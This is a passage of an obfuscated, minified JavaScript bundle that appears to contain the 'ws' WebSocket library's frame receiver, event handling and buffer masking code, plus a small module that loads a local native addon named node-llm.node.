_0x403376=_0x4c8c3b,_0x4ee969=this[_0x42aeef];_0x4ee969[_0x403376(0x121)]!==_0x215055[_0x403376(0xf6)]&&(_0x4ee969[_0x403376(0x121)]===_0x215055[_0x403376(0x11e)]&&(_0x4ee969[_0x403376(0x111)]=_0x215055['CLOSING'],_0x470f55(_0x4ee969)),this[_0x403376(0xe9)][_0x403376(0x1ac)](),_0x4ee969[_0x403376(0xed)]||(_0x4ee969[_0x403376(0xed)]=!0x0,_0x4ee969[_0x403376(0x200)](_0x403376(0x1b9),_0x5e1cb8)));}function _0x470f55(_0x23849d){const _0x95cadf=_0x4c8c3b;_0x23849d[_0x95cadf(0x136)]=setTimeout(_0x23849d[_0x95cadf(0xe9)][_0x95cadf(0x220)][_0x95cadf(0x204)](_0x23849d[_0x95cadf(0xe9)]),0x7530);}function _0x5540e4(){const _0x5a6920=_0x4c8c3b,_0x17d166=this[_0x42aeef];let _0x25e692;this[_0x5a6920(0xf2)](_0x5a6920(0x1d3),_0x5540e4),this[_0x5a6920(0xf2)](_0x5a6920(0x19a),_0x2aa04e),this[_0x5a6920(0xf2)]('end',_0xc7a36a),_0x17d166['_readyState']=_0x215055[_0x5a6920(0x196)],this['_readableState'][_0x5a6920(0x1a9)]||_0x17d166[_0x5a6920(0x194)]||_0x17d166[_0x5a6920(0xad)][_0x5a6920(0x223)][_0x5a6920(0x19b)]||null===(_0x25e692=_0x17d166[_0x5a6920(0xe9)][_0x5a6920(0x1c1)]())||_0x17d166[_0x5a6920(0xad)][_0x5a6920(0xe6)](_0x25e692),_0x17d166[_0x5a6920(0xad)]['end'](),this[_0x42aeef]=void 0x0,clearTimeout(_0x17d166[_0x5a6920(0x136)]),_0x17d166[_0x5a6920(0xad)][_0x5a6920(0x223)][_0x5a6920(0x132)]||_0x17d166[_0x5a6920(0xad)][_0x5a6920(0x223)][_0x5a6920(0x19b)]?_0x17d166[_0x5a6920(0x170)]():(_0x17d166[_0x5a6920(0xad)]['on'](_0x5a6920(0x1b9),_0x576c8e),_0x17d166[_0x5a6920(0xad)]['on'](_0x5a6920(0x8c),_0x576c8e));}function _0x2aa04e(_0x59ef4d){const _0x26d307=_0x4c8c3b;this[_0x42aeef]['_receiver'][_0x26d307(0xe6)](_0x59ef4d)||this[_0x26d307(0x110)]();}function _0xc7a36a(){const _0x5b007f=_0x4c8c3b,_0x2d2346=this[_0x42aeef];_0x2d2346[_0x5b007f(0x111)]=_0x215055['CLOSING'],_0x2d2346['_receiver'][_0x5b007f(0x1ac)](),this[_0x5b007f(0x1ac)]();}function _0x2a6bab(){const _0x5b90cc=_0x4c8c3b,_0x477941=this[_0x42aeef];this[_0x5b90cc(0xf2)](_0x5b90cc(0x1b9),_0x2a6bab),this['on']('error',_0x278a2f),_0x477941&&(_0x477941['_readyState']=_0x215055[_0x5b90cc(0x196)],this[_0x5b90cc(0x220)]());}Object[_0x4c8c3b(0x19c)](_0x215055,_0x4c8c3b(0x11f),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x11f))}),Object[_0x4c8c3b(0x19c)](_0x215055['prototype'],_0x4c8c3b(0x11f),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x11f))}),Object['defineProperty'](_0x215055,_0x4c8c3b(0x11e),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x11e))}),Object['defineProperty'](_0x215055[_0x4c8c3b(0x25b)],_0x4c8c3b(0x11e),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x11e))}),Object['defineProperty'](_0x215055,'CLOSING',{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x196))}),Object[_0x4c8c3b(0x19c)](_0x215055[_0x4c8c3b(0x25b)],_0x4c8c3b(0x196),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0x196))}),Object[_0x4c8c3b(0x19c)](_0x215055,_0x4c8c3b(0xf6),{'enumerable':!0x0,'value':_0x32abe9[_0x4c8c3b(0x1f4)](_0x4c8c3b(0xf6))}),Object[_0x4c8c3b(0x19c)](_0x215055[_0x4c8c3b(0x25b)],'CLOSED',{'enumerable':!0x0,'value':_0x32abe9['indexOf'](_0x4c8c3b(0xf6))}),['binaryType',_0x4c8c3b(0x74),'extensions',_0x4c8c3b(0xd7),_0x4c8c3b(0x112),'readyState',_0x4c8c3b(0x23d)][_0x4c8c3b(0x1a8)](_0x772f18=>{const _0xf1b8b8=_0x4c8c3b;Object[_0xf1b8b8(0x19c)](_0x215055[_0xf1b8b8(0x25b)],_0x772f18,{'enumerable':!0x0});}),['open',_0x4c8c3b(0x1b9),_0x4c8c3b(0x1d3),_0x4c8c3b(0x1df)][_0x4c8c3b(0x1a8)](_0x3bfcc6=>{const _0x2ec14e=_0x4c8c3b;Object[_0x2ec14e(0x19c)](_0x215055[_0x2ec14e(0x25b)],'on'+_0x3bfcc6,{'enumerable':!0x0,'get'(){for(const _0x5e52cc of this['listeners'](_0x3bfcc6))if(_0x5e52cc[_0x1b0a17])return _0x5e52cc[_0x5272ce];return null;},'set'(_0x18e7ff){const _0x79c4c=_0x2ec14e;for(const _0x25cfeb of this['listeners'](_0x3bfcc6))if(_0x25cfeb[_0x1b0a17]){this[_0x79c4c(0xf2)](_0x3bfcc6,_0x25cfeb);break;}_0x79c4c(0xd4)==typeof _0x18e7ff&&this[_0x79c4c(0xb7)](_0x3bfcc6,_0x18e7ff,{[_0x1b0a17]:!0x0});}});}),_0x215055['prototype'][_0x4c8c3b(0xb7)]=_0xb97fd0,_0x215055[_0x4c8c3b(0x25b)]['removeEventListener']=_0x33b30b,_0x1a5a41['exports']=_0x215055;},0x6a(_0x496181){'use strict';const _0x23d137=a0_0x208b;_0x496181[_0x23d137(0x1f0)]=require(_0x23d137(0x71));},0xb5(_0x3df74b){'use strict';const _0x179ec3=a0_0x208b;_0x3df74b[_0x179ec3(0x1f0)]=require(_0x179ec3(0xcc));},0xcb(_0x345a4c){'use strict';const _0x4b00d3=a0_0x208b;_0x345a4c[_0x4b00d3(0x1f0)]=require(_0x4b00d3(0xd9));},0xed(_0x5c0365,_0xa79972,_0x5a2ff2){'use strict';const _0x2b0f13=a0_0x208b;const {tokenChars:_0x113bf7}=_0x5a2ff2(0x370);_0x5c0365[_0x2b0f13(0x1f0)]={'parse':function(_0x5bf8d4){const _0x31a699=_0x2b0f13,_0x5239cc=new Set();let _0x4815ce=-0x1,_0x530a66=-0x1,_0x41715=0x0;for(;_0x41715<_0x5bf8d4[_0x31a699(0x1d7)];_0x41715++){const _0x4b1bc2=_0x5bf8d4[_0x31a699(0x15c)](_0x41715);if(-0x1===_0x530a66&&0x1===_0x113bf7[_0x4b1bc2])-0x1===_0x4815ce&&(_0x4815ce=_0x41715);else{if(0x0===_0x41715||0x20!==_0x4b1bc2&&0x9!==_0x4b1bc2){if(0x2c!==_0x4b1bc2)throw new SyntaxError(_0x31a699(0x8d)+_0x41715);{if(-0x1===_0x4815ce)throw new SyntaxError(_0x31a699(0x8d)+_0x41715);-0x1===_0x530a66&&(_0x530a66=_0x41715);const _0x4d7a96=_0x5bf8d4[_0x31a699(0x233)](_0x4815ce,_0x530a66);if(_0x5239cc[_0x31a699(0x183)](_0x4d7a96))throw new SyntaxError(_0x31a699(0x1da)+_0x4d7a96+_0x31a699(0x1ef));_0x5239cc[_0x31a699(0x181)](_0x4d7a96),_0x4815ce=_0x530a66=-0x1;}}else-0x1===_0x530a66&&-0x1!==_0x4815ce&&(_0x530a66=_0x41715);}}if(-0x1===_0x4815ce||-0x1!==_0x530a66)throw new SyntaxError('Unexpected\x20end\x20of\x20input');const _0x4fdf49=_0x5bf8d4[_0x31a699(0x233)](_0x4815ce,_0x41715);if(_0x5239cc[_0x31a699(0x183)](_0x4fdf49))throw new SyntaxError(_0x31a699(0x1da)+_0x4fdf49+'\x22\x20subprotocol\x20is\x20duplicated');return _0x5239cc[_0x31a699(0x181)](_0x4fdf49),_0x5239cc;}};},0x116(_0x692803){'use strict';const _0x52917e=a0_0x208b;_0x692803[_0x52917e(0x1f0)]=require(_0x52917e(0x10c));},0x11e(_0x30dd84,_0x3ff09b,_0x2d2a8c){'use strict';const _0x4b2fb5=a0_0x208b;const {Writable:_0x1104ba}=_0x2d2a8c(0xcb),_0x5dae80=_0x2d2a8c(0x3cb),{BINARY_TYPES:_0x51fe15,EMPTY_BUFFER:_0x60a25a,kStatusCode:_0x43e46e,kWebSocket:_0x2d31a4}=_0x2d2a8c(0x266),{concat:_0x48cbeb,toArrayBuffer:_0x19fafd,unmask:_0x43c704}=_0x2d2a8c(0x152),{isValidStatusCode:_0xc8e619,isValidUTF8:_0xaac895}=_0x2d2a8c(0x370),_0x5b5e7f=Buffer[Symbol[_0x4b2fb5(0xe4)]];_0x30dd84[_0x4b2fb5(0x1f0)]=class extends _0x1104ba{constructor(_0x42d3dc={}){const _0x1d2794=_0x4b2fb5;super(),this[_0x1d2794(0xbc)]=void 0x0===_0x42d3dc[_0x1d2794(0x16e)]||_0x42d3dc[_0x1d2794(0x16e)],this['_binaryType']=_0x42d3dc['binaryType']||_0x51fe15[0x0],this[_0x1d2794(0x10e)]=_0x42d3dc['extensions']||{},this[_0x1d2794(0x16d)]=!!_0x42d3dc[_0x1d2794(0xeb)],this['_maxPayload']=0x0|_0x42d3dc[_0x1d2794(0x190)],this[_0x1d2794(0xf3)]=!!_0x42d3dc[_0x1d2794(0x242)],this[_0x2d31a4]=void 0x0,this[_0x1d2794(0x22c)]=0x0,this[_0x1d2794(0x177)]=[],this[_0x1d2794(0x24a)]=!0x1,this['_payloadLength']=0x0,this[_0x1d2794(0x13b)]=void 0x0,this[_0x1d2794(0x184)]=0x0,this[_0x1d2794(0x9e)]=!0x1,this[_0x1d2794(0x1dd)]=!0x1,this['_opcode']=0x0,this[_0x1d2794(0x92)]=0x0,this[_0x1d2794(0x88)]=0x0,this[_0x1d2794(0xb1)]=[],this[_0x1d2794(0x1d8)]=!0x1,this['_loop']=!0x1,this[_0x1d2794(0x1c4)]=0x0;}['_write'](_0x1b2087,_0x2a0f98,_0x256221){const _0x228ec5=_0x4b2fb5;if(0x8===this[_0x228ec5(0x237)]&&0x0==this[_0x228ec5(0x1c4)])return _0x256221();this['_bufferedBytes']+=_0x1b2087[_0x228ec5(0x1d7)],this[_0x228ec5(0x177)][_0x228ec5(0xa9)](_0x1b2087),this['startLoop'](_0x256221);}[_0x4b2fb5(0x80)](_0x1acdb8){const _0x328c25=_0x4b2fb5;if(this['_bufferedBytes']-=_0x1acdb8,_0x1acdb8===this[_0x328c25(0x177)][0x0][_0x328c25(0x1d7)])return this['_buffers'][_0x328c25(0x171)]();if(_0x1acdb8<this[_0x328c25(0x177)][0x0]['length']){const _0x28c336=this[_0x328c25(0x177)][0x0];return this[_0x328c25(0x177)][0x0]=new _0x5b5e7f(_0x28c336[_0x328c25(0xcc)],_0x28c336[_0x328c25(0x260)]+_0x1acdb8,_0x28c336[_0x328c25(0x1d7)]-_0x1acdb8),new _0x5b5e7f(_0x28c336[_0x328c25(0xcc)],_0x28c336['byteOffset'],_0x1acdb8);}const _0x4c41b3=Buffer[_0x328c25(0x1f1)](_0x1acdb8);do{const _0x23d394=this[_0x328c25(0x177)][0x0],_0x253f65=_0x4c41b3[_0x328c25(0x1d7)]-_0x1acdb8;_0x1acdb8>=_0x23d394[_0x328c25(0x1d7)]?_0x4c41b3[_0x328c25(0xd5)](this[_0x328c25(0x177)][_0x328c25(0x171)](),_0x253f65):(_0x4c41b3[_0x328c25(0xd5)](new Uint8Array(_0x23d394[_0x328c25(0xcc)],_0x23d394[_0x328c25(0x260)],_0x1acdb8),_0x253f65),this['_buffers'][0x0]=new _0x5b5e7f(_0x23d394[_0x328c25(0xcc)],_0x23d394[_0x328c25(0x260)]+_0x1acdb8,_0x23d394[_0x328c25(0x1d7)]-_0x1acdb8)),_0x1acdb8-=_0x23d394[_0x328c25(0x1d7)];}while(_0x1acdb8>0x0);return _0x4c41b3;}[_0x4b2fb5(0x1a3)](_0x39af98){const _0x1e780f=_0x4b2fb5;this[_0x1e780f(0x93)]=!0x0;do{switch(this[_0x1e780f(0x1c4)]){case 0x0:this[_0x1e780f(0x1ec)](_0x39af98);break;case 0x1:this['getPayloadLength16'](_0x39af98);break;case 0x2:this['getPayloadLength64'](_0x39af98);break;case 0x3:this[_0x1e780f(0x104)]();break;case 0x4:this[_0x1e780f(0xe0)](_0x39af98);break;case 0x5:case 0x6:return void(this[_0x1e780f(0x93)]=!0x1);}}while(this['_loop']);this[_0x1e780f(0x1d8)]||_0x39af98();}['getInfo'](_0x1a85fe){const _0x26c1f5=_0x4b2fb5;if(this[_0x26c1f5(0x22c)]<0x2)return void(this[_0x26c1f5(0x93)]=!0x1);const _0x25dce0=this[_0x26c1f5(0x80)](0x2);if(0x30&_0x25dce0[0x0])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,_0x26c1f5(0x1d6),!0x0,0x3ea,_0x26c1f5(0xb5)));const _0x2d88a0=!(0x40&~_0x25dce0[0x0]);if(!_0x2d88a0||this[_0x26c1f5(0x10e)][_0x5dae80[_0x26c1f5(0x1e6)]]){if(this['_fin']=!(0x80&~_0x25dce0[0x0]),this['_opcode']=0xf&_0x25dce0[0x0],this['_payloadLength']=0x7f&_0x25dce0[0x1],0x0===this['_opcode']){if(_0x2d88a0)return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,'RSV1\x20must\x20be\x20clear',!0x0,0x3ea,_0x26c1f5(0x263)));if(!this[_0x26c1f5(0x184)])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,'invalid\x20opcode\x200',!0x0,0x3ea,_0x26c1f5(0x23a)));this['_opcode']=this[_0x26c1f5(0x184)];}else{if(0x1===this[_0x26c1f5(0x237)]||0x2===this[_0x26c1f5(0x237)]){if(this[_0x26c1f5(0x184)])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,_0x26c1f5(0x25a)+this['_opcode'],!0x0,0x3ea,_0x26c1f5(0x23a)));this['_compressed']=_0x2d88a0;}else{if(!(this[_0x26c1f5(0x237)]>0x7&&this['_opcode']<0xb))return void _0x1a85fe(this['createError'](RangeError,'invalid\x20opcode\x20'+this[_0x26c1f5(0x237)],!0x0,0x3ea,_0x26c1f5(0x23a)));if(!this[_0x26c1f5(0x1dd)])return void _0x1a85fe(this['createError'](RangeError,_0x26c1f5(0x96),!0x0,0x3ea,_0x26c1f5(0x1ab)));if(_0x2d88a0)return void _0x1a85fe(this['createError'](RangeError,'RSV1\x20must\x20be\x20clear',!0x0,0x3ea,_0x26c1f5(0x263)));if(this[_0x26c1f5(0xb4)]>0x7d||0x8===this[_0x26c1f5(0x237)]&&0x1===this['_payloadLength'])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,_0x26c1f5(0xd1)+this[_0x26c1f5(0xb4)],!0x0,0x3ea,_0x26c1f5(0x6e)));}}if(this['_fin']||this[_0x26c1f5(0x184)]||(this[_0x26c1f5(0x184)]=this[_0x26c1f5(0x237)]),this['_masked']=!(0x80&~_0x25dce0[0x1]),this['_isServer']){if(!this[_0x26c1f5(0x9e)])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,_0x26c1f5(0x75),!0x0,0x3ea,'WS_ERR_EXPECTED_MASK'));}else{if(this[_0x26c1f5(0x9e)])return void _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,_0x26c1f5(0xf0),!0x0,0x3ea,_0x26c1f5(0x106)));}0x7e===this[_0x26c1f5(0xb4)]?this[_0x26c1f5(0x1c4)]=0x1:0x7f===this[_0x26c1f5(0xb4)]?this[_0x26c1f5(0x1c4)]=0x2:this[_0x26c1f5(0x1ba)](_0x1a85fe);}else _0x1a85fe(this[_0x26c1f5(0x201)](RangeError,'RSV1\x20must\x20be\x20clear',!0x0,0x3ea,_0x26c1f5(0x263)));}['getPayloadLength16'](_0x25cd46){const _0x4636d1=_0x4b2fb5;this[_0x4636d1(0x22c)]<0x2?this[_0x4636d1(0x93)]=!0x1:(this[_0x4636d1(0xb4)]=this[_0x4636d1(0x80)](0x2)[_0x4636d1(0x20a)](0x0),this[_0x4636d1(0x1ba)](_0x25cd46));}[_0x4b2fb5(0xaa)](_0x413dbd){const _0x11c4d8=_0x4b2fb5;if(this[_0x11c4d8(0x22c)]<0x8)return void(this[_0x11c4d8(0x93)]=!0x1);const _0x4785d6=this[_0x11c4d8(0x80)](0x8),_0x5bb08f=_0x4785d6[_0x11c4d8(0x146)](0x0);_0x5bb08f>Math[_0x11c4d8(0xe7)](0x2,0x15)-0x1?_0x413dbd(this[_0x11c4d8(0x201)](RangeError,_0x11c4d8(0x25e),!0x1,0x3f1,_0x11c4d8(0x22e))):(this[_0x11c4d8(0xb4)]=_0x5bb08f*Math[_0x11c4d8(0xe7)](0x2,0x20)+_0x4785d6['readUInt32BE'](0x4),this[_0x11c4d8(0x1ba)](_0x413dbd));}[_0x4b2fb5(0x1ba)](_0x5c346d){const _0x395f4a=_0x4b2fb5;this[_0x395f4a(0xb4)]&&this[_0x395f4a(0x237)]<0x8&&(this['_totalPayloadLength']+=this[_0x395f4a(0xb4)],this[_0x395f4a(0x92)]>this[_0x395f4a(0x1be)]&&this['_maxPayload']>0x0)?_0x5c346d(this[_0x395f4a(0x201)](RangeError,_0x395f4a(0x1a7),!0x1,0x3f1,_0x395f4a(0x1ee))):this['_masked']?this['_state']=0x3:this['_state']=0x4;}[_0x4b2fb5(0x104)](){const _0x2e0586=_0x4b2fb5;this[_0x2e0586(0x22c)]<0x4?this[_0x2e0586(0x93)]=!0x1:(this[_0x2e0586(0x13b)]=this['consume'](0x4),this['_state']=0x4);}[_0x4b2fb5(0xe0)](_0x1a84c8){const _0x46dd43=_0x4b2fb5;let _0x24804b=_0x60a25a;if(this[_0x46dd43(0xb4)]){if(this[_0x46dd43(0x22c)]<this[_0x46dd43(0xb4)])return void(this[_0x46dd43(0x93)]=!0x1);_0x24804b=this[_0x46dd43(0x80)](this[_0x46dd43(0xb4)]),this[_0x46dd43(0x9e)]&&0x0!==(this[_0x46dd43(0x13b)][0x0]|this[_0x46dd43(0x13b)][0x1]|this[_0x46dd43(0x13b)][0x2]|this[_0x46dd43(0x13b)][0x3])&&_0x43c704(_0x24804b,this[_0x46dd43(0x13b)]);}if(this[_0x46dd43(0x237)]>0x7)this[_0x46dd43(0x262)](_0x24804b,_0x1a84c8);else{if(this['_compressed'])return this[_0x46dd43(0x1c4)]=0x5,void this[_0x46dd43(0x22b)](_0x24804b,_0x1a84c8);_0x24804b[_0x46dd43(0x1d7)]&&(this[_0x46dd43(0x88)]=this[_0x46dd43(0x92)],this[_0x46dd43(0xb1)][_0x46dd43(0xa9)](_0x24804b)),this[_0x46dd43(0x7e)](_0x1a84c8);}}[_0x4b2fb5(0x22b)](_0x46aa12,_0x39f64d){const _0x1558d8=_0x4b2fb5;this[_0x1558d8(0x10e)][_0x5dae80[_0x1558d8(0x1e6)]][_0x1558d8(0x22b)](_0x46aa12,this[_0x1558d8(0x1dd)],(_0x1807e0,_0x1e7116)=>{const _0x41d378=_0x1558d8;if(_0x1807e0)return _0x39f64d(_0x1807e0);if(_0x1e7116[_0x41d378(0x1d7)]){if(this[_0x41d378(0x88)]+=_0x1e7116['length'],this[_0x41d378(0x88)]>this[_0x41d378(0x1be)]&&this[_0x41d378(0x1be)]>0x0){const _0x35eb26=this[_0x41d378(0x201)](RangeError,'Max\x20payload\x20size\x20exceeded',!0x1,0x3f1,_0x41d378(0x1ee));return void _0x39f64d(_0x35eb26);}this[_0x41d378(0xb1)][_0x41d378(0xa9)](_0x1e7116);}this['dataMessage'](_0x39f64d),0x0===this[_0x41d378(0x1c4)]&&this[_0x41d378(0x1a3)](_0x39f64d);});}[_0x4b2fb5(0x7e)](_0x467630){const _0x248384=_0x4b2fb5;if(!this[_0x248384(0x1dd)])return void(this['_state']=0x0);const _0x449cfb=this['_messageLength'],_0x1e5a14=this[_0x248384(0xb1)];if(this['_totalPayloadLength']=0x0,this[_0x248384(0x88)]=0x0,this['_fragmented']=0x0,this['_fragments']=[],0x2===this[_0x248384(0x237)]){let _0x3e5d3d;_0x3e5d3d='nodebuffer'===this['_binaryType']?_0x48cbeb(_0x1e5a14,_0x449cfb):'arraybuffer'===this[_0x248384(0x145)]?_0x19fafd(_0x48cbeb(_0x1e5a14,_0x449cfb)):_0x248384(0x86)===this['_binaryType']?new Blob(_0x1e5a14):_0x1e5a14,this['_allowSynchronousEvents']?(this[_0x248384(0x200)](_0x248384(0x1df),_0x3e5d3d,!0x0),this['_state']=0x0):(this[_0x248384(0x1c4)]=0x6,setImmediate(()=>{const _0x1bc3bc=_0x248384;this[_0x1bc3bc(0x200)](_0x1bc3bc(0x1df),_0x3e5d3d,!0x0),this[_0x1bc3bc(0x1c4)]=0x0,this[_0x1bc3bc(0x1a3)](_0x467630);}));}else{const _0x57e93c=_0x48cbeb(_0x1e5a14,_0x449cfb);if(!this['_skipUTF8Validation']&&!_0xaac895(_0x57e93c)){const _0x400f68=this[_0x248384(0x201)](Error,_0x248384(0xcd),!0x0,0x3ef,_0x248384(0x7b));return void _0x467630(_0x400f68);}0x5===this[_0x248384(0x1c4)]||this[_0x248384(0xbc)]?(this['emit'](_0x248384(0x1df),_0x57e93c,!0x1),this[_0x248384(0x1c4)]=0x0):(this[_0x248384(0x1c4)]=0x6,setImmediate(()=>{const _0xf8ee99=_0x248384;this[_0xf8ee99(0x200)](_0xf8ee99(0x1df),_0x57e93c,!0x1),this[_0xf8ee99(0x1c4)]=0x0,this['startLoop'](_0x467630);}));}}[_0x4b2fb5(0x262)](_0x5962f6,_0x560c4b){const _0x364872=_0x4b2fb5;if(0x8!==this[_0x364872(0x237)])this[_0x364872(0xbc)]?(this['emit'](0x9===this[_0x364872(0x237)]?'ping':_0x364872(0xc1),_0x5962f6),this[_0x364872(0x1c4)]=0x0):(this[_0x364872(0x1c4)]=0x6,setImmediate(()=>{const _0x5351ad=_0x364872;this['emit'](0x9===this['_opcode']?_0x5351ad(0x186):'pong',_0x5962f6),this[_0x5351ad(0x1c4)]=0x0,this[_0x5351ad(0x1a3)](_0x560c4b);}));else{if(0x0===_0x5962f6[_0x364872(0x1d7)])this[_0x364872(0x93)]=!0x1,this[_0x364872(0x200)](_0x364872(0x6f),0x3ed,_0x60a25a),this[_0x364872(0x1ac)]();else{const _0x48fc7b=_0x5962f6[_0x364872(0x20a)](0x0);if(!_0xc8e619(_0x48fc7b)){const _0x413e88=this['createError'](RangeError,_0x364872(0x1e9)+_0x48fc7b,!0x0,0x3ea,_0x364872(0x21f));return void _0x560c4b(_0x413e88);}const _0x3ac515=new _0x5b5e7f(_0x5962f6['buffer'],_0x5962f6[_0x364872(0x260)]+0x2,_0x5962f6[_0x364872(0x1d7)]-0x2);if(!this[_0x364872(0xf3)]&&!_0xaac895(_0x3ac515)){const _0x131cc9=this[_0x364872(0x201)](Error,_0x364872(0xcd),!0x0,0x3ef,_0x364872(0x7b));return void _0x560c4b(_0x131cc9);}this[_0x364872(0x93)]=!0x1,this[_0x364872(0x200)](_0x364872(0x6f),_0x48fc7b,_0x3ac515),this[_0x364872(0x1ac)]();}this[_0x364872(0x1c4)]=0x0;}}[_0x4b2fb5(0x201)](_0x1900ad,_0x59c446,_0x18cfe6,_0x1951be,_0x524737){const _0xe838e9=_0x4b2fb5;this[_0xe838e9(0x93)]=!0x1,this[_0xe838e9(0x1d8)]=!0x0;const _0x2c12ae=new _0x1900ad(_0x18cfe6?_0xe838e9(0xfa)+_0x59c446:_0x59c446);return Error[_0xe838e9(0x1d0)](_0x2c12ae,this[_0xe838e9(0x201)]),_0x2c12ae[_0xe838e9(0x17c)]=_0x524737,_0x2c12ae[_0x43e46e]=_0x1951be,_0x2c12ae;}};},0x152(_0x7b6c84,_0x566de2,_0x239b79){'use strict';const _0x3ac1b1=a0_0x208b;const {EMPTY_BUFFER:_0x262514}=_0x239b79(0x266),_0x24592b=Buffer[Symbol['species']];function _0x14f228(_0x5b23b9,_0x43904f,_0x19ca41,_0x4f10cb,_0x235ecf){for(let _0x4a18e6=0x0;_0x4a18e6<_0x235ecf;_0x4a18e6++)_0x19ca41[_0x4f10cb+_0x4a18e6]=_0x5b23b9[_0x4a18e6]^_0x43904f[0x3&_0x4a18e6];}function _0x1c3437(_0x536ede,_0x37abde){const _0xe0656d=a0_0x208b;for(let _0x33627f=0x0;_0x33627f<_0x536ede[_0xe0656d(0x1d7)];_0x33627f++)_0x536ede[_0x33627f]^=_0x37abde[0x3&_0x33627f];}if(_0x7b6c84[_0x3ac1b1(0x1f0)]={'concat':function(_0x5c1a92,_0x23b0c5){const _0x70ff3c=_0x3ac1b1;if(0x0===_0x5c1a92[_0x70ff3c(0x1d7)])return _0x262514;if(0x1===_0x5c1a92['length'])return _0x5c1a92[0x0];const _0x2f2124=Buffer['allocUnsafe'](_0x23b0c5);let _0xe22963=0x0;for(let _0x3e4500=0x0;_0x3e4500<_0x5c1a92['length'];_0x3e4500++){const _0x1ed624=_0x5c1a92[_0x3e4500];_0x2f2124[_0x70ff3c(0xd5)](_0x1ed624,_0xe22963),_0xe22963+=_0x1ed624['length'];}return _0xe22963<_0x23b0c5?new _0x24592b(_0x2f2124[_0x70ff3c(0xcc)],_0x2f2124['byteOffset'],_0xe22963):_0x2f2124;},'mask':_0x14f228,'toArrayBuffer':function(_0xff1b3f){const _0x21473f=_0x3ac1b1;return _0xff1b3f[_0x21473f(0x1d7)]===_0xff1b3f[_0x21473f(0xcc)][_0x21473f(0x90)]?_0xff1b3f[_0x21473f(0xcc)]:_0xff1b3f[_0x21473f(0xcc)][_0x21473f(0x233)](_0xff1b3f[_0x21473f(0x260)],_0xff1b3f[_0x21473f(0x260)]+_0xff1b3f[_0x21473f(0x1d7)]);},'toBuffer':function _0x2620f0(_0x335afc){const _0x3f4332=_0x3ac1b1;if(_0x2620f0[_0x3f4332(0xbf)]=!0x0,Buffer['isBuffer'](_0x335afc))return _0x335afc;let _0xef6d17;return _0x335afc instanceof ArrayBuffer?_0xef6d17=new _0x24592b(_0x335afc):ArrayBuffer['isView'](_0x335afc)?_0xef6d17=new _0x24592b(_0x335afc[_0x3f4332(0xcc)],_0x335afc[_0x3f4332(0x260)],_0x335afc[_0x3f4332(0x90)]):(_0xef6d17=Buffer[_0x3f4332(0x1f7)](_0x335afc),_0x2620f0['readOnly']=!0x1),_0xef6d17;},'unmask':_0x1c3437},!process[_0x3ac1b1(0x1eb)][_0x3ac1b1(0x240)])try{const _0x517000=_0x239b79(Object((function(){const _0x24b5f0=_0x3ac1b1;var _0x83e772=new Error(_0x24b5f0(0x7a));throw _0x83e772[_0x24b5f0(0x17c)]='MODULE_NOT_FOUND',_0x83e772;}())));_0x7b6c84[_0x3ac1b1(0x1f0)]['mask']=function(_0x343bb9,_0x2992b9,_0x1f2e45,_0x19cd0f,_0x239757){const _0x365a43=_0x3ac1b1;_0x239757<0x30?_0x14f228(_0x343bb9,_0x2992b9,_0x1f2e45,_0x19cd0f,_0x239757):_0x517000[_0x365a43(0x1a0)](_0x343bb9,_0x2992b9,_0x1f2e45,_0x19cd0f,_0x239757);},_0x7b6c84[_0x3ac1b1(0x1f0)][_0x3ac1b1(0x1af)]=function(_0x1a90be,_0x311f57){const _0x2e6a1a=_0x3ac1b1;_0x1a90be[_0x2e6a1a(0x1d7)]<0x20?_0x1c3437(_0x1a90be,_0x311f57):_0x517000[_0x2e6a1a(0x1af)](_0x1a90be,_0x311f57);};}catch(_0x19663e){}},0x1b2(_0x3933fd){'use strict';_0x3933fd['exports']=require('events');},0x240(_0x56373b,_0x4b83e1,_0xe41752){const _0xae93e2=a0_0x208b;_0x56373b=_0xe41752[_0xae93e2(0x1fa)](_0x56373b);try{process[_0xae93e2(0x1e2)](_0x56373b,_0xe41752(0x3a0)[_0xae93e2(0x219)](__dirname,_0xe41752['p'],'packages/llm/node-llm.node'));}catch(_0x9e46e1){throw new Error(_0xae93e2(0x1b6)+_0x9e46e1);}},0x255(_0x330403,_0x3d3116,_0x2325dd){'use strict';const _0x2c4257=a0_0x208b;const {kForOnEventAttribute:_0x24b5c7,kListener:_0x655c0b}=_0x2325dd(0x266),_0xe6b207=Symbol('kCode'),_0x48ad16=Symbol(_0x2c4257(0xc0)),_0x123f99=Symbol(_0x2c4257(0xf7)),_0x10f37f=Symbol(_0x2c4257(0x195)),_0xfea365=Symbol('kReason'),_0x41b23d=Symbol(_0x2c4257(0x173)),_0x33e7d3=Symbol('kType'),_0x5c86f5=Symbol(_0x2c4257(0x1e4));class _0x471113{constructor(_0x2f5298){this[_0x41b23d]=null,this[_0x33e7d3]=_0x2f5298;}get['target'](){return this[_0x41b23d];}get[_0x2c4257(0x81)](){return this[_0x33e7d3];}}Object[_0x2c4257(0x19c)](_0x471113[_0x2c4257(0x25b)],'target',{'enumerable':!0x0}),Object[_0x2c4257(0x19c)](_0x471113[_0x2c4257(0x25b)],_0x2c4257(0x81),{'enumerable':!0x0});class _0x27c346 extends _0x471113{constructor(_0x53514c,_0x3a1b83={}){const _0x298ff9=_0x2c4257;super(_0x53514c),this[_0xe6b207]=void 0x0===_0x3a1b83[_0x298ff9(0x17c)]?0x0:_0x3a1b83['code'],this[_0xfea365]=void 0x0===_0x3a1b83['reason']?'':_0x3a1b83['reason'],this[_0x5c86f5]=void 0x0!==_0x3a1b83[_0x298ff9(0x163)]&&_0x3a1b83[_0x298ff9(0x163)];}get['code'](){return 